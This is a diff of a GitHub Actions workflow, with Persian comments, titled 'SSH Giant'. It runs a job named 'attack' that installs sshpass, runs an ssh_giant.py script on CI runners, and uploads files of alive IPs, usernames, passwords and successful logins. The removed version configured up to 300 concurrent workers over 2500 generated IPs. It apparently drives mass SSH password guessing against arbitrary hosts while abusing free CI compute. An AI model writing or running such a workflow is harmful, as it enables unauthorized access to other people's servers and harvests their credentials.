@@ -1,49 +1,28 @@
-name: SSH Giant - 4 Runner Attack
+name: SSH Giant - 10 Runners
 
 on:
-  workflow_dispatch:    # دکمه Run workflow در صفحه اکشن
-    inputs:
-      max_workers:
-        description: 'تعداد کارگر همزمان (پیشفرض 300)'
-        required: false
-        default: '300'
-      max_ips:
-        description: 'حداکثر آی‌پی برای تولید (پیشفرض 2500)'
-        required: false
-        default: '2500'
+  workflow_dispatch:
 
 jobs:
   attack:
     runs-on: ubuntu-latest
-    timeout-minutes: 360   # حداکثر 6 ساعت
+    timeout-minutes: 360
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-
-      - name: Set up Python
-        uses: actions/setup-python@v5
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
         with:
           python-version: '3.11'
-
-      - name: Install dependencies
-        run: |
-          sudo apt update
-          sudo apt install -y sshpass
-
-      - name: Run SSH Giant
-        run: |
-          python ssh_giant.py
-        env:
-          MAX_WORKERS: ${{ github.event.inputs.max_workers || '300' }}
-
+      - name: Install sshpass
+        run: sudo apt update && sudo apt install -y sshpass
+      - name: Run Giant
+        run: python ssh_giant.py
       - name: Upload results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: ssh-giant-results
+          name: giant-results
           path: |
-            all_ips.txt
+            success.txt
             alive_ips.txt
             usernames.txt
             passwords.txt
-            success.txt
